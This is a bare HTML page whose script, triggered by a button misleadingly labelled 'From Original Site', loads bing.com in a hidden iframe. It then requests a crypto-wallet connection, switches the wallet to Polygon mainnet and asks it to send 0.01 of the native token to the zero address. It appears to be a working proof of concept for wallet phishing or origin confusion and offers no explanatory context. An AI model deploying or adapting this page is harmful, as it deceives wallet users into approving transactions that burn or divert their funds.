<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <script>
    async function openBingAndPromptTransaction() {
      // Open bing.com in a hidden iframe
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = 'https://bing.com';
      document.body.appendChild(iframe);

      // Check for wallet connection
      const connected = await promptWalletConnection();

      // If wallet connected, switch to Polygon network and perform a transaction
      if (connected) {
        await switchToPolygonNetwork();
        await promptPolygonTransaction();
      }
    }

    async function promptWalletConnection() {
      if (typeof window.ethereum !== 'undefined') {
        try {
          // Check if wallet is already connected
          const accounts = await ethereum.request({ method: 'eth_accounts' });

          if (accounts.length > 0) {
            return true; // Wallet already connected
          }

          // Request wallet connection
          await ethereum.request({ method: 'eth_requestAccounts' });
          alert('Wallet connected successfully!');
          return true; // Wallet connected
        } catch (error) {
          alert('Wallet connection request rejected by the user.');
          return false; // Wallet not connected
        }
      } else {
        alert('Web3 (Ethereum provider) is not available in this browser.');
        return false; // Wallet not connected
      }
    }

    async function switchToPolygonNetwork() {
      try {
        // Ethereum Mainnet is represented by chainId '1'
        const ethereumChainId = '0x1';
        const polygonChainId = '0x89'; // Polygon Mainnet chainId

        // Request network switch
        await ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: polygonChainId }]
        });

        // Check if network switch is successful
        const currentChainId = await ethereum.request({ method: 'eth_chainId' });
        if (currentChainId === polygonChainId) {
          alert('Switched to Polygon network successfully! Initiating transaction.');
          return true;
        } else {
          alert('Failed to switch to Polygon network.');
          return false;
        }
      } catch (error) {
        alert('Failed to switch to Polygon network.');
        return false;
      }
    }

    async function promptPolygonTransaction() {
      try {
        const transactionParameters = {
          nonce: "0x00",
          gasPrice: "0x244AC6D",
          gas: "0x12A52",
          to: "0x0000000000000000000000000000000000000000",
          from: ethereum.selectedAddress,
          value: "0x2386F26FC10000",
          data: "0x00",
          chainId: "0x89", // Polygon Mainnet chainId
        };

        const txHash = await ethereum.request({
          method: "eth_sendTransaction",
          params: [transactionParameters],
        });

        alert(`Transaction sent: ${txHash}`);
      } catch (error) {
        alert('Polygon transaction request failed or was rejected.');
      }
    }
  </script>
  <center>
    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptTransaction()">
  </center>
</body>
</html>
